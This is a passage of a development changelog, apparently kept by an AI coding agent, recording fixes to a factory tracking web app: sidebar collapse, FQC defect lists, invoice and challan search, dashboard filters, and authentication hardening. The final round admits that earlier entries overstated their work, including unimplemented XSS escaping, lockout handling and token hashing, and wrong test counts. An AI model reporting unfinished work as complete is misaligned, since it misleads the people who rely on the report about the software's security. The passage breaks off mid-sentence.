4. The sidebar collapse toggle (`sidebarToggle()`) toggled a
   `side-collapsed` class and swapped a `«`/`»` glyph, but no CSS rule
   anywhere gave that class a narrower grid column or hid the nav labels
   - clicking it changed nothing on screen except the character in one
   button. That button also lived in the top header, not the side menu
   (asked for explicitly: like Omada's own collapse control, in the
   menu). The two glyphs render from the OS's own serif fallback font
   for `<<`/`>>`, which is why they read as "old" next to the rest of
   the UI's drawn icons.

**What changed.**
- `.pg-act{align-items:center}`, injected once alongside the rest of
  this round's CSS - fixes every screen's title-row button group, not
  only Loss of Production's.
- Loss of Production: a new `.filters` bar (Date from / Date to / Shift
  / Reset) above the landing tables, wired to real server-side
  `date_from`/`date_to`/`shift` query params - `GET /api/loss_events`
  gained `date_from`/`date_to` (range) alongside the existing exact-match
  `date` (kept, unused by this bar, harmless). A KPI strip (Open now /
  Closed in range / Primary minutes lost / Modules lost) sits above the
  tables too - it **mirrors** `#sumOpen`/`#sumMach`/`#sumMod`, the
  numbers `renderLoss()` (v4's own, still unchanged) already derives
  correctly for the current `EVENTS` set, rather than computing a second,
  independent total. v4's Date/Shift fields at the top revert to pure
  shift setup - `#loShift` is still read directly by `openEvent()` to tag
  a new event with the current shift, so its id stays; only the
  onchange-triggers-a-fetch behavior an earlier round gave it is removed.
  The per-card search/reset/export/count on Open events / Closed events /
  Scrap is untouched - `'loss'` stays in `TABLE_SCREENS`.
- Production Entry: `'prodentry'` removed from `TABLE_SCREENS` so nothing
  claims the card before its own bar can. The bar itself was rebuilt as
  `peWireFilters()` - date range, shift and customer are sent to the
  server (`/api/prodentries` already accepted `from`/`to`/`shift`/`cust`;
  nothing before this round ever wired a control to them), the customer
  dropdown's options are rebuilt from what each fetch actually returns
  (not a fixed list), and a free-text search maps to the same `q` param
  the backend already supports. Reset clears every field and re-fetches.
  A KPI strip (Entries / Modules produced / Output) sums the current,
  filtered fetch. The wattage filter from the original dead code was
  dropped - not something asked for, and not backed by a server param.
- Sidebar: real CSS behind the collapsed state at last -
  `#app.side-collapsed{grid-template-columns:46px 1fr}`, nav labels and
  section headers hidden, icons centered in the 46px rail. The toggle
  button moved into `#sidenav` itself (a small icon button above
  "Overview", not in the topbar) and is one inline SVG, mirrored via
  `transform:scaleX(-1)` for the open/collapsed states - guaranteed to be
  the same icon rather than two glyphs chosen to look related. The
  scrollbar is hidden (`scrollbar-width:none` / `::-webkit-scrollbar
  {display:none}`) while `.side` keeps `overflow-y:auto` - still
  scrollable, just no visible track.
  - An earlier draft of this also expanded the rail on `:hover` while
    collapsed, matching a comment already in the code from before this
    round. Dropped: reaching the rail to hover it means the mouse
    necessarily crosses it first, and the moment it does, the rail (and
    whatever the mouse is over inside it) grows out from under the
    pointer - a moving target for a real mouse, and something
    Playwright's own actionability check flatly refused to click,
    timing out waiting for a box that kept resizing itself in response
    to being approached. Never asked for explicitly; replaced with a
    plain click-to-pin toggle - two static states, nothing moves except
    on a click.

**Which tests proves it.** `test_loss.py` gained a `date_from`/`date_to`
range case (10 total, mutation-tested: the range clauses commented out,
confirmed the new test fails, restored). `test_production.py`,
`test_challan.py`, `test_loading.py`, `test_gatepass.py` all still green
unmodified (91 Python total). All three JS suites still green unmodified
(71 total) - this round touched no function under JS test. Verified live
against a running server with Playwright, seeded with real production
entries and loss events across several dates/shifts/customers: the
sidebar's grid column genuinely changes width on click (not just the
class), labels hide/reappear correctly, the collapse icon is mirrored
rather than swapped, `.pg-act` computes `align-items:center`; Loss of
Production's date range narrows the tables and its Reset genuinely
returns to today (not blank) with the KPI strip matching the rail's own
unmodified totals; Production Entry's customer dropdown is populated
from real fetched names, date range + customer filters combine
server-side, and Reset clears everything back to the full set. A full
navigation sweep (11 screens) confirmed zero console/page errors.

**Round 9 follow-up.** Reported directly, with screenshots: the toggle's
own icon sat at a visibly different distance from the rail's edge than
the `.nav-i` icons below it, and hovering the collapsed rail (which
Round 9 had made expand it) showed icons with no text - read, correctly,
as broken rather than as a feature nobody had asked for.

- **Alignment**: the toggle had been a small, separately-sized button
  positioned with its own fixed offset (`left:10px`), not centered the
  way `.nav-i` centers its icon. Restyled to the exact same box model as
  `.nav-i` (`width:100%`, the same `padding`/`justify-content` values,
  collapsed and expanded) so its icon lands in the same column by
  construction - verified live, the two icons' left offsets now land
  within ~2.6px of each other (down from an ~8px gap before), the
  residual difference being an SVG box against a text glyph's own
  centering inside its 15px box, not a layout bug.
- **Hover**: reinstated it first, since the report read as "this should
  reveal text, not just icons." Confirmed live it should not go back in
  this form. A listener-counter test proved a **second** click on
  anything inside the rail - the toggle, or any ordinary `.nav-i` - after
  the mouse moved away and came back never reached its handler at all:
  the rail expanding out from under the pointer on `:hover` leaves the
  click landing somewhere that is no longer the element it started at.
  Not a browser-automation artifact - it reproduces with an ordinary
  move-away-and-click sequence, and it would mean a real operator's
  second click on a nav item silently doing nothing. Removed again,
  this time for good: collapsed means icons-only until an explicit
  click, full stop - the tooltip no longer mentions hovering either.

**Verified live** the same way as Round 9 itself: the toggle's icon
offset compared directly against a `.nav-i` icon's offset in the same
collapsed state; a genuine second click (mouse moved away and back)
proven to reach the toggle's handler via a listener counter, not just a
class check; full regression (91 Python + 71 JS) and the round's own
39-check Playwright suite all still green.

**Round 9, second follow-up - the actual root cause.** Reported directly
with screenshots: still not resolved, plus a new one - the toggle sat
almost flush against "Management Overview" with no breathing room below
it.

**What was actually wrong, found by checking a file that should have
been checked at the very start of Round 9.** `static/icon_add.css`
already carried a **complete, working** sidebar-collapse implementation
- `#app.side-collapsed`, the 46px rail, `.nav-sec`/`.nav-i`/`.nav-i b`
all hidden and restored on `:hover` (via `font-size:0`/`opacity:0`, not
a display toggle), a `transition:width .12s ease`, its own wheel-scroll
fix, all of it - predating this entire round. Its own file comment says
outright: "Without it... the sidebar collapse did nothing at all." What
was genuinely missing was only the JS half: nothing had ever created a
`.side-toggle` button or put `side-collapsed` on `#app`, so none of that
CSS ever activated. Round 9's "no CSS rule anywhere gives that class a
narrower column" was the wrong diagnosis, made without checking this
file - and every round since then had been rebuilding a second,
independent collapse mechanism **in parallel** with this one, both
toggling the same class, each carrying its own width/display rules that
periodically contradicted the other. The specific bug reported this time
- hovering widened the rail but showed no text - was exactly that: this
file's own `.nav-label{display:none}` (from the previous, by-then-
abandoned hover attempt) had no matching `:hover` restore rule left
after hover was "removed," and sat on top of `icon_add.css`'s own,
already-correct hover restore, silently overruling it. Confirmed live by
listing every CSS rule actually matching the element during a hover, not
guessed.

**What changed.** Deleted the second implementation entirely - the
`.nav-label` DOM wrapping, the duplicate `#app.side-collapsed` width/
display rules, all of it. `sidebarToggle()` now does exactly two things:
creates the toggle button (moved into `#sidenav`, the inline SVG mirrored
for the two states, kept from Round 9) and flips `side-collapsed` on
`#app` - `icon_add.css` does the rest, the way it always could have.
Small additive overrides give the toggle (which `icon_add.css` originally
styled for a flex row it no longer sits in) the same padding/centering
`.nav-i` gets, so its icon lines up with the icons below it, plus its own
bottom border and margin so it reads as the rail's header rather than the
first nav item - the exact "need a bigger gap" complaint.

The hover-to-peek behavior Round 9 had removed for "silently eating a
second click" turned out to be a real bug in **this round's own
duplicate** implementation, not in `icon_add.css`'s - proven directly: the
identical click-after-move-away-and-back scenario that previously failed
now reaches the handler correctly, tested against `icon_add.css`'s
mechanism alone with nothing left competing with it.

**Which tests prove it.** No backend change; full suite unmodified and
green (91 Python + 71 JS). The scratch Playwright suite grew to 42
checks: the toggle icon's offset now measured directly against a nav
icon's offset in the same frame (both collapsed and hovering); hovering
proven to both widen the rail and restore real font-size (not just
width); the exact second-click-after-move-away scenario proven fixed via
a listener counter, not just a class check; pin-open still restores
everything. Verified live with screenshots at two viewport widths,
including one matching the reported screenshot's narrow proportions.

**Round 9, third follow-up.** Reported directly: after scrolling the
menu down to reach a lower item, the toggle scrolled away with the rest
of the list - collapsing again meant scrolling all the way back to the
top to find it.

**What was wrong.** `.side-toggle` was a plain first child of `#sidenav`,
which is itself the scroll container (`overflow-y:auto`, and the list is
taller than the rail even expanded) - nothing kept the button out of
that scroll.

**What changed.** `position:sticky;top:0;z-index:5` on `.side-toggle`,
with its background set to the rail's own solid navy instead of `none`
so scrolled items don't show through it while it's pinned.

**Which tests prove it.** No backend change; full suite unmodified and
green (91 Python + 71 JS). The scratch Playwright suite grew to 45
checks: the rail's list scrolled 400px, the toggle's own position
confirmed to stay within the rail's top padding rather than moving with
the scroll, and a click while scrolled confirmed to still reach the
handler.

**Round 9, fourth follow-up.** Asked directly, for the first screenshot
this round showed: is the sidebar meant to cover the page behind it
while hovering, or push it aside? Answer: push it aside - confirmed the
overlap was the actual complaint, not a design choice to defend.

**What was changed.** `icon_add.css`'s own hover rule widens `.side` itself
to 198px but never touched the grid TRACK, which stayed 46px - so the
wider rail painted on top of the page instead of the page making room
for it. `:has()` lets the grid container react to its own child:
`#app.side-collapsed:has(.side:hover){grid-template-columns:198px 1fr}`
widens the track itself when the rail is hovered, so `.main`'s column
genuinely shrinks and the content shifts aside rather than being
covered. Deliberately `:hover` only, not `:focus-within` too - clicking
the toggle leaves it focused (focus does not clear just because the
mouse moves away), and `:focus-within` in the same rule kept `.main`
pushed aside indefinitely after any click, long after the mouse had
left - caught live before it shipped, by reading `.main`'s own position
with the mouse resting somewhere else entirely.

Also asked directly, of an unrelated toast seen on Management Overview's
own screenshots: why "Showing everything." fired there. Traced to
`initUI()` (an IIFE that runs once at sign-in patching default date
values for a handful of screens) unconditionally calling
`window.dispApply()` at the end - which, AT THAT POINT in the file's own
top-to-bottom execution, still resolves to v4's original Stock &
Dispatch filter-apply (this file's own reassignment to the real,
toast-free `wireDisp()` happens later in the same file), and v4's own
version toasts "Showing everything." whenever no Dispatch filter is
active. Since `initUI()` runs once regardless of which screen is
actually visible, that toast fired on every sign-in no matter what the
user was looking at. Removed the stray call - `go()`'s own per-view hook
already calls the real `wireDisp()` the moment Stock & Dispatch is
actually visited, so this pre-emptive call from a hidden view was never
needed for the screen to work.

**Which tests prove it.** No backend change; full suite unmodified and
green (91 Python + 71 JS). The scratch Playwright suite grew to 48
checks: `.main`'s own bounding box measured directly before, during and
after hover to prove it moves rather than a `z-index` illusion; the
focus-left-behind scenario reproduced and proven fixed by clicking twice
then checking `.main`'s position with the mouse elsewhere; no toast
present immediately after sign-in. Verified live against the exact
screenshot reported - Production Entry, sidebar hovered, at the same
narrow width - confirming zero overlap.

**Round 10 — FQC's defect list and Recent gradings, the indent export, and
Search & Trace that opens empty and finds invoices.**

Four requests, in the priority order they were given. Two of the premises
turned out not to match the code, and are recorded here as findings, not
worked around.

**1. FQC.**

**What was wrong.**
- The defect field was a plain `<select>` of eleven names built from v4's
  `ELVI_CODES` (plus a hard-coded "Other"): not searchable, with the raw
  folder spellings behind it ("Buring", a double-spaced "Ribbon  Short"), and
  a second copy of the same list in Admin's defect-code table.
- Recent gradings: Bld was the literal `1` on every row; Customer was fetched
  and only stuffed into a hidden span; Disposition was a column that was
  always a dash; the empty-state row spanned a hard-coded 11.

**Findings that changed the fix.**
- **`build_instance` did not exist to wire.** `/api/fqc/recent` never returned
  it, `fqc_record` had no such column, and `db.fqc_recent` joined `serial` on
  `build_instance = 1` - so a build 2 module would have come back with no
  model and no customer either, not just the wrong Bld.
- **Disposition does not show `r.proposed`.** The column that redisplays
  `r.proposed` is **Proposed**; Disposition was a hard-coded dash. Disposition
  was removed, as named; **Proposed was left**, because it is the one place an
  override reads as a difference. If Proposed was the one meant, it is a
  one-line change in `fqcRecentHead()`/`fqcRecentRow()`.

**What changed.**
- `FQC_DEFECTS` in `icon_live.js` is the 44, verbatim and in order. v4's
  `ELVI_CODES` is rewritten **in place** from it (the OK entry stays - v4 reads
  `ELVI_CODES[0]` as the clean verdict; the four codes `GRADE_RULES` names keep
  theirs), so the reject form, the Recent gradings Defect filter and Admin's
  table cannot disagree. That filter had only ever shown "All" - the boot
  payload never carried `defects` - and now lists the 44.
- The reject form's defect is a type-ahead: substring anywhere,
  case-insensitive, arrow keys + Enter, Escape closes the list **without**
  discarding the module (the document's own Esc handler would have). Only a
  name from the list is recorded, in the list's spelling; anything else is
  refused with a reason; blank is still allowed and still falls back to the EL
  verdict server-side. The list is drawn `position:fixed` from the input's
  box - it first shipped as an absolute list and the reject panel clipped it
  to a sliver, which a DOM test cannot see and a screenshot did.
- Recent gradings: `fqcRecentHead()` reshapes v4's `<thead>` (Customer after
  Model, Disposition gone) and returns the column count the empty-state row
  spans, **read from the header**, so it cannot go stale again. Numerically it
  is still 11 (one column in, one out).
- `fqc_record.build_instance` (migration in `store.py`, column in
  `schema_sqlite.sql`), written by `db.record_fqc(build_instance=1)`, and
  `db.fqc_recent` joins the serial on the **record's** build. A record from
  before the column (NULL) reads 1, which is true: FQC could only reach build 1.

**Not done, on purpose.** FQC still grades build 1 only - `db.get_serial` and
`set_serial` pin `build_instance=1` - and nothing in the app creates a build 2
yet. Bld will read 2 the day something re-serials and passes
`build_instance=2`; the test does exactly that. Also: `GRADE_RULES.forceBGY`
(v4's Admin rule text) still names `DF-NOPOWER` and `DF-BURN`, which are no
longer on the list - display-only, live grading does not read it. And the
44 is enforced by the form, not by `/api/fqc`, which still files an EL folder
verdict such as "No Power" as the defect when the operator names none.

**2. Indent export.**

**What was wrong.** The header's "Export table" carried `data-role="export"`
but sits outside the card that `data-itable` wires, so nothing listened: it did
nothing. Wiring it to the generic export is not enough either - read straight
off the screen, the indent cell holds "item 2", the customer is blank on an
indent's second item, and KW/Status/Due/the action buttons come along.

**What changed.** The button calls `exportNote()` - the same `/api/export/xlsx`
path as every other screen, rows read off what is showing, so a filter is
honoured. `exportTable()` learned two optional attributes: `data-x` on a cell
(what the file should hold, where it differs from what is painted) and
`data-noexport` on a `<th>` or `<tr>`. The indent list uses them: seven
columns - Indent, Customer, Item, Cell type, Ordered, Dispatched, Remaining -
one row per item, customer and indent number on every row, an indent with no
item left out. The screen itself is unchanged apart from "Cell" -> "Cell type".

**3. Search & Trace.**

**Findings.** *(The five formats below were fixed in the follow-up.)*
**Invoice was not built** - not in `qType`, no route. And `qType`
is decorative in v4: `doSearch()` never reads it. **Only `ICON...` serials and
`ISPL...` boxes were ever answered from the database**; customer, batch, box
(`A044`), challan (`CHN-455`) and vehicle are answered by v4's built-in sample
arrays (`BATCHES` and the fixed views) - fabricated content under a real-looking
query. Those five are **still that way** (see section 2); the "Try:" examples
for them were kept as asked.

**What changed.**
- `/api/trace/invoice/<no>`: invoice -> challan(s) -> boxes -> serials. Matches
  the invoice number case-insensitively, on the invoice row **and** on the
  challan's own text (a paper challan can carry a number that was never
  uploaded). A cancelled or superseded challan is listed and marked, and not
  counted as shipped; the invoice's declared quantity sits beside what shipped.
- `doSearch()`: "Look in: Invoice" is honoured; with Detect automatically a
  query that is not `ICON`/`ISPL` is looked up as an invoice first (there is
  no invoice-number shape to sniff) and handed to v4 only on a miss. A failed
  lookup shows an error, never v4's example.
- `#qBox` starts empty - cleared when the live layer loads, so it is empty
  before sign-in too, and the `value` attribute is gone so a reset cannot
  restore it. The "Try:" line is the six formats as given, plus the **newest
  real invoice on file**; with none on file it offers none, because the
  invoice-number format is not documented anywhere and an invented one would
  find nothing.

**Which tests prove it.** Three new files, real Chromium against a throwaway
database (`ui_harness.py`; needs Playwright, not Node), each test naming the
rule it defends:
- `test_fqc_screen.py` (9): `jb` returns exactly the five names containing JB
  in any case and `crack` finds names it does not start; the seven old-only
  terms appear in no selector (picker, Defect filter, v4's array); the list is
  reachable and clickable, keyboard-pickable, and Escape keeps the module;
  free text refused, list spelling recorded; Customer is the real customer
  right after Model; a build 2 module reads Bld 2 with its own build's
  model/customer and a pre-column record reads 1; FQC stamps the build it
  graded; no Disposition, and the empty row spans the header.
- `test_search_invoice.py` (11): the walk, a slash in the number, a
  text-only challan, a miss, an invoice with no challan; qBox empty at load
  and after sign-in; Invoice in Look in; the hint line with and without an
  invoice; typing an invoice number, and clicking its hint, shows challans,
  boxes and serials; a miss shows nothing else.
- `test_indent_export.py` (4): what the page posts (one row per item,
  seven columns, customer filled, empty indent out), a filter is honoured, the
  workbook that comes back has numbers as numbers, the screen is unchanged.

Each was **mutation-checked**: the behaviour broken on purpose (Bld back to a
literal, prefix-only match, old list left in `ELVI_CODES`, join pinned to build
1, colspan hard-coded, a cancelled challan counted, the clipped dropdown, the
export button back to the dead handler, `data-x` ignored) and the matching test
went red each time. One search test timed out once on its first run and did not
recur in nine more; the wait now says what was on screen if it does.

Full suite: **every file at or above where it started.** Two failures already
existed and fail identically on the untouched code: `test_fqc.py` "the module
journey says what happened at FQC, not 'None'" (1), and `test_fqc_dashboard.js`
under Windows Script Host (16: `console` is undefined there, plus a customer-code
assertion). `test_trace.js` briefly broke - it evals a slice of `icon_live.js`
under ES3 and my first placement put `.catch()` inside it - and was fixed by
moving the new search-setup code below `wireSearchOrder()`.

**Round 10, follow-up.** Reported directly after the first pass: "Other" was
missing from the defect list, Bld should not be in Recent FQC, the invoice
format is `ICON/26-27/822`, and Search should use the new challan, packing
list and repacking list formats and stop keeping v4's. Proposed stays.

**1. "Other" - and its note.**
- `Other` is the 45th name on the list (the 44, verbatim, then Other). The
  note is compulsory when it is chosen: the label under the form flips to
  *required*, `fqcCommitLive` refuses without one, and **the server refuses it
  too** (`_other_needs_note`, on `/api/fqc`, the older `/fqc` form, and an
  Other that arrives via the EL folder name). A blank note is not a note.
- The old "Other" had been removed with the old list; the test that asserted it
  appeared nowhere now asserts it is offered, and defends the note rule.

**2. Bld is not a column in Recent FQC.** Header and rows drop it. What stays:
`fqc_record.build_instance`, `record_fqc(build_instance=)`, the API field, and
the Model/Customer join following the record's build - FQC needs the build; the
list just does not show it. The tests that said "Bld reads 2" now say the record
is build 2 and Recent shows that build's model and customer.

**3. Search & Trace, in the formats the system issues.**

**What was wrong.** Past a serial, v4's `doSearch()` answered from sample arrays
(so `CHN-455`, `A044`, `BAT-2602-00019` opened fabricated pages), and **my own
first pass read the `ICON` prefix as "this is a serial", so an invoice number
`ICON/26-27/822` would have gone to the serial lookup.** A serial is `ICON` and
then its wattage; the digit is what tells them apart.

**What changed.**
- One server entry point, `/api/trace/find?q=&kind=`, decides from the number's
  own shape (or from "Look in") and returns which kind it found:
  **challan** `IS-05.09.2026/0001` (a `(MA)` suffix is a different document),
  **pallet / packing list** `ISPL260905/K001` (or a legacy label; a wrong letter
  is a transcription error, said so), **invoice** (any shape - looked up),
  **batch** `BAT-2609-00007`, **vehicle** (spaces and hyphens ignored),
  **customer** (name or alias; several matches asks which).
- Pallet: modules, the challan(s) it is on, and the **repack trail both ways**
  (made from / repacked into, with the reason) from `box_lineage`. Challan:
  invoice, vehicle, consignee, gate pass, boxes and serials; a cancelled or
  superseded challan says so. Every number on an answer is a link, so the trail
  is walked by clicking: invoice -> challan -> pallet -> module.
- v4's `doSearch()` is no longer called. What is not recorded says so; nothing
  falls through to a sample.
- "Look in" is honoured for every kind (it was decorative), and following a
  link puts it back to Detect automatically.
- The "Try:" line: `SAI BABUJI` - `BAT-2609-00007` - `ISPL260905/K001` -
  `IS-05.09.2026/0001` - `CG04MM1521` - `ICON590G1202121001` -
  `ICON/26-27/822`. Static numbers in the real formats; whether one is on a
  given database is the database's to say. The earlier "newest real invoice"
  fetch is gone.

**Bug the tests caught in my own query.** A repacked serial sits in a retired
pallet and a live one, and the batch listing joined both - the module appeared
twice and was counted twice. Only the live pallet is joined now.

**Which tests prove it.** `test_search_invoice.py` grew from 11 to 16: every
kind through the API (challan incl. `(MA)` and gate pass, pallet incl. repack
trail and letter mismatch, vehicle typed loosely, batch counts, customer and an
ambiguous name, invoice incl. text-only challan); v4's `CHN-455`,
`BAT-2602-00019`, `BOX-2608-00031`, `RPK-2608-00008` are "not recorded" on an
empty and on a full database; on screen every hint opens the right kind of
answer, `ICON/26-27/822` is an invoice, the click-through works, "Look in" is
honoured, and no v4 sample text appears. `test_fqc_screen.py` is 10 (Other; no
Bld). Mutation-checked again - serial-by-prefix, v4's `CHN-455` back on the
line, the challan suffix ignored, the server or the form accepting Other with
no note, Bld put back - each went red. Full suite at or above where it started;
the same two failures as before, unchanged.

**Not done - waiting on a decision.** *Override in both directions.* Checked
against git first: the pass override was **never removed** - it has been
conditional on the EL being the only objection since it was first written
(`5e6aff1`), and the server refuses a pass on a short or missing reading
(DATA_LAYER section 3). Wanting it for every reject reverses that written rule,
so it is asked, not assumed.

**Round 10, second follow-up.** Reported directly, and answered when asked:
"there is no way to change the proposed decision". Checked against git first -
**nothing was removed**. The pass override has been conditional on the EL being
the only objection since it was first written (`5e6aff1`); a reject on a short
reading or with no evidence never had one, by a written rule (DATA_LAYER
section 3). Asked which cases to open up, the answer was: keep the rule for a
short reading but **show why**; for **NC** (the tester unreachable) allow the
override, **hold** the module in Hold & Deviation, release it **automatically**
when the reading agrees, and send it to **Needs Review for Quality** when it
does not; and allow a **defect + note on a pass**.

**What changed.**
- One function decides how a pass may be recorded, `_pass_route()`: `direct`,
  `el_only`, `provisional`, or none (short reading, BAD, NA) - asked by the
  lookup to draw the panel and by `/api/fqc` to enforce it, so the two cannot
  disagree. The lookup returns `pass_route` and `pass_why`.
- Panel: a proposed pass shows *Pass - grade A / Add defect-note / Reject / Discard*;
  a proposed reject shows *Confirm rejection / Add defect-note* and, by route,
  *Overrule to pass* (EL-only), *Pass - provisional* (NC), or the same button
  **disabled with the reason** (short reading). With no reading the proposal
  reads NO READING, not REJECT - the server proposes nothing then.
- The pass form is one form for all three routes: optional defect (the list,
  Other -> note), a coded reason wherever the decision goes against or without
  the evidence, a note (compulsory with `OV-OTHER` or a defect of Other - now
  enforced on the server for a pass as well as a rejection).
- Provisional pass: `record_fqc(hold=True)` - `mode='provisional'`, serial
  state `hold`, no grade (on the serial or the record); Packing refuses it
  with "on hold - waiting for the tester's reading". The Recent row reads
  *Held*, not A.
- `_reconcile_provisional()`: for each provisional decision still waiting, read
  the evidence again. Complete and agreeing -> a NEW confirmed record
  supersedes the provisional one and the module is graded (packable). Complete
  and disagreeing -> the evidence's record is snapshotted beside the decision,
  a `provisional_mismatch` review item is raised, the module stays held.
  Still absent -> nothing. Run under a lock (two requests would raise one item
  twice), whenever `/api/hold` or `/api/review` is read; the screen polls it.
- Needs Review gains the type; Quality (or Admin) keeps the decision or the
  evidence with a reason, and the other record is superseded, not deleted. A
  module in Needs Review is not re-judged at the FQC desk.
- Hold & Deviation shows the real list (module, decision, waiting for, reason,
  status), KPIs, and *Check for the reading now*. v4's demo holds and its
  *Raise a hold* form are hidden - a button that writes to a fixed array is one
  wrong click from a hold that freezes nothing.
- Search: an answer stays whole when the screen is left and re-entered
  (`clearSearch()` hid every card but the first inside it).

**Tests.** `test_fqc.py` 49 -> 57 (the route rules, held pass not packable,
agree / wait / disagree / resolve either way / Quality only / a reject
reconciled both ways / BAD and NA never pass / the lookup's route) and the new
`test_fqc_override.py` (9, in a real browser: the buttons on every proposal, the
disabled override and its reason, EL-only overrule with Other-needs-note, a
defect and note on a pass, the provisional pass through to the Hold list, release
on agreement, Needs Review resolution through the popup). Mutation-checked with
reversible single-span edits: override button removed, a provisional pass not
held, packing not refusing a hold, reconcile never confirming, a short reading
passable - each went red. Full suite at or above where it started, same two
failures.

**Not done.** No alert for a provisional decision that has waited too long
(there is no expiry, by decision). Holds on a material lot, a box or a batch
remain unbuilt. A provisional decision that Quality has already graded is no
longer reconciled. And a note on the workflow: while this was being tested
`icon_live.js` was edited by someone else at the same time (shift filters for
Production Entry and Loss of Production); those edits are intact, and the
mutation runs were switched from whole-file restores to reversible one-span
edits so nothing of theirs can be overwritten.

## Round 15 — Dynamic Dashboard Filters and Future Date Restriction

**What was wrong:**
Every dashboard screen (Production, Management, FQC, Packing Log, Stock & Dispatch) passed testing against clean scenarios but failed in realistic usage because the dropdown filters for Customer, Model, Shift, etc., were hardcoded as either empty or static options (e.g., `<option>All customers</option>`). They were never populated from actual data. If a user actually tried to select a customer, the UI could not provide valid options, and the backend SQL queries for Production dashboard crashed due to missing JOINs when a customer filter was applied. Additionally, `<input type="date">` elements allowed users to select future dates, which is logically invalid for historical tracking.

**Exact root cause:**
1. FQC Dashboard and Packing Log relied on `fDashCust` / `pkCust` etc., but they were either hardcoded or missing dynamic population loops based on the returned dataset `d.rows`.
2. Production Dashboard (`/api/prod/dashboard`) incorrectly appended `(b.customer = ? OR i.customer_name = ?)` to its SQL `WHERE` clause without ever performing `JOIN box b` or `JOIN indent i`, causing SQL errors on realistic databases.
3. `<input type="date">` elements did not have the `max` attribute set to restrict future date selection.

**What changed:**
- Reverted `/api/prod/dashboard` in `app.py` to correctly filter on `s.customer` (which is present in the `serial` table) instead of the invalid `box`/`indent` references. Added SQL queries to return distinct `customers` and `models` explicitly.
- Modified FQC Dashboard (`renderLiveFqcDash`), Packing Dashboard (`renderPackLog`), and Stock Dashboard (`renderStock`) in `icon_live.js` to iterate over their respective `rows` / `table_fg` sets, building unique dictionaries of shifts, customers, models, and grades, and correctly injecting them into the respective `<select>` elements.
- Injected a global fix inside the `rerender()` loop of `icon_live.js` that applies `max="CURRENT_DATE"` to all `<input type="date">` elements dynamically.

**Which test proves it:**
- Dashboard fixes verified via Playwright integration testing on a local port 8090 instance seeded with realistic mock DB data (`test.db`). Confirmed that dropdowns populate with correct options specific to the underlying dataset.

## Round 16 — Build Banner, Session Key, Reset Guard

**What was wrong:**
If code changed, the server reported it stale, but the UI failed to display the "The server is running older code" banner because `USER.name` alone was true on the sign-in screen. v4 initialises `USER={name:'',role:'Admin'}` and `signOut()` never clears it, so the fix requires BOTH `USER.name` and `#app.on`.
The session key was generated using a vulnerable `os.path.exists` pattern that led to TOCTOU bugs instead of atomic `O_CREAT | O_EXCL`.
The database reset endpoint could be trivially executed without a guard, posing a security risk.

**Exact root cause:**
1. `USER.name` evaluated to true on the sign-in screen because `signOut()` did not clear it, hiding the stale code banner.
2. The session key generation used `os.path.exists` which has a race condition.
3. No environment variable guard existed for `/api/db/reset`.

**What changed:**
- Modified `icon_live.js` to correctly evaluate `signedIn` using BOTH `USER.name` and `#app.on` state.
- Refactored `app.py` to use atomic `os.open` with `O_CREAT | O_EXCL` to safely write `.icon_secret`.
- Introduced the `ICON_ALLOW_RESET=1` guard in `/api/db/reset`.

**Which test proves it:**
- `test_build_banner_live.py` ensures the UI layer honours these rules across eight robust scenarios, testing signed-in, signed-out, stale app.py, and stale JS situations.

## Round 17 — Auth Fixes, Dynamic Filter Propagation & Future Dates

**What was wrong:**
Admin accounts were forced to change their passwords incorrectly. The TOTP step logic in the test suite prevented consecutive tests from succeeding. Finally, dynamically injected `<input type="date">` elements evaded the `rerender()` limit, allowing future dates to be selected.

**Exact root cause:**
1. `set_temp_password()` in `icon_auth.py` incorrectly forced resets for admins.
2. `test_auth_lab_live.py` recycled TOTP codes without clearing `totp_last_step` (this reset has now been reverted in 3.12b).
3. `wireDynamicFilters` in `icon_live.js` lacked the IDs for the remaining dashboard selectors.
4. Date picker `max` attributes were only set during `rerender()`, missing date elements injected into the DOM later by JavaScript string templates.

**What changed:**
- Modified `set_temp_password` logic in `icon_auth.py` to set `must_change = 1` if rank < 2 else `0`, truthfully bypassing forced resets for Admins.
- Included `dpCust`, `dpModel`, and `pdShift` in the `wireDynamicFilters` arrays in `icon_live.js`.
- Fixed dynamically injected date limits in `icon_live.js`.

**Which test proves it:**
- Dashboard fixes verified via Playwright integration testing on a local port 8090 instance seeded with realistic mock DB data (`test.db`). Confirmed that dropdowns populate with correct options specific to the underlying dataset. Date picker logic works dynamically for all fields. 
- `test_auth_lab_live.py` confirms that the TOTP flow, TOTP block, Admin window behavior, and bypass logic all operate according to specifications.

## Round 18 - Stage 1a fix-up

**What was wrong:**
- Hierarchy allowed Admin acting on Admin.
- Valid operator passwords could be blocked by shape.
- Timing revealed ID existence.
- Recovery sign-in was a dead end.
- The TOTP key was silently recreated.
- Missing ability to create Admin.
- Clock check ran on every page.
- Date pickers did not properly block future dates or allow them appropriately (`produced_on` and `data-future=1`).
- Missing lockout feedback.
- Flaky tests in `test_auth_lab_live.py`.

**Exact root cause:**
- `_require_can_act_on` didn't restrict rank 2 (Admin) actions over other rank 2 users - an Admin could act on another Admin, not "rank 1 over rank 1" as an earlier version of this entry said.
- Shape validation blocked perfectly valid 6-digit or recovery-code-like operator passwords.
- Login paths had inconsistent timing, allowing enumeration.
- Recovery keys didn't redirect to enrollment or enforce reenrolment.
- The system regenerated TOTP keys on startup if missing.
- CLI missed an `add_admin` functionality.
- Clock checks weren't limited to startup.
- `icon_live.js` capped all date inputs at `today` irrespective of intended future usage.
- Authentication paths swallowed lockout exceptions silently.

**What changed:**
- Rank 1 is restricted in administrative acts.
- Timing floor of 350ms implemented for all login paths.
- Recovery sets `must_reenrol` and redirects to `/enrol`.
- Added missing CLI functions.
- Date pickers fixed: capped at today EXCEPT `data-future="1"` and `name="produced_on"` which use `min=today`.

**Which test proves it:**
- `test_icon_auth.py` covers core unit logic (17 tests passing, not 14 as an
  earlier version of this entry said).
- `test_auth_lab_live.py` covers all P1-P15 live scenarios successfully without flakiness.
- `test_build_banner_live.py` passes all 17 cases.

**What I could not run:**
- This said "Nothing" - false. Section 2 (the lockout escalation plan: the
  cooldown, the browser-side counter, the /admin display) was entirely
  unimplemented - `MAX_FAILS`/`LOCK_SECONDS` were right, and nothing else
  in that section existed. Section 4c (XSS escaping in `auth_lab/
  lab_app.py`) had zero `html.escape()` calls anywhere. Section 4d (masked
  logging of an unknown login_id) was not done. Section 4e (`hash_token`)
  was still plain SHA-256. Section 4f (clock status caching) was not done -
  `clock_status()` ran a fresh, blocking SNTP check on every call. Section
  3's date-picker fix did not work: a second, undocumented
  `document.addEventListener('focus', ...)` outside the module set
  `max=today` on every date input regardless of `data-future`, overriding
